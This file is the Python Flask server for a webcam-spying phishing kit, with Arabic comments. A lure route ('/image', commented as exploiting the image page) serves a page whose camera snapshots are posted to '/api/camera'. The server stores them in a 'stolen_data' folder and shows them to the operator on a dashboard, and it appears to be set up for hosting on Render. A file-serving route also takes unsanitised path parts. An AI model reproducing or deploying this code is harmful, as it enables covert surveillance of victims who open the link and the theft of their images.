#!/usr/bin/env python3
import os
import base64
from datetime import datetime
from flask import Flask, request, jsonify, render_template, send_file
from flask_socketio import SocketIO

# إعداد المسارات لضمان عمل الروابط على Render
base_dir = os.path.abspath(os.path.dirname(__file__))
app = Flask(__name__, 
            template_folder=os.path.join(base_dir, 'templates'),
            static_folder=os.path.join(base_dir, 'static'))

app.config['SECRET_KEY'] = 'cairopy_sec_2024'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='gevent')

# إنشاء مجلدات الحفظ تلقائياً
STOLEN_DIR = os.path.join(base_dir, "stolen_data")
os.makedirs(os.path.join(STOLEN_DIR, 'camera'), exist_ok=True)

# 1. الرابط الذي طلبته (استغلال صفحة الصورة)
@app.route('/image')
def image_attack():
    return render_template('image.html') # سيقرأ الملف من مجلد templates

# 2. لوحة التحكم لرؤية النتائج
@app.route('/dashboard')
def dashboard():
    files = os.listdir(os.path.join(STOLEN_DIR, 'camera'))
    return render_template('dashboard.html', files={'camera': files}, victim_ip="Unknown")

# 3. API استقبال الصور من رابط /image
@app.route('/api/camera', methods=['POST'])
def receive_camera():
    data = request.json
    img_data = data.get('image', '')
    if img_data:
        filename = f"snap_{datetime.now().strftime('%H%M%S')}.jpg"
        path = os.path.join(STOLEN_DIR, 'camera', filename)
        with open(path, 'wb') as f:
            f.write(base64.b64decode(img_data.split(',')[1] if ',' in img_data else img_data))
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

@app.route('/stolen/<category>/<filename>')
def serve_stolen(category, filename):
    return send_file(os.path.join(STOLEN_DIR, category, filename))

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host='0.0.0.0', port=port)
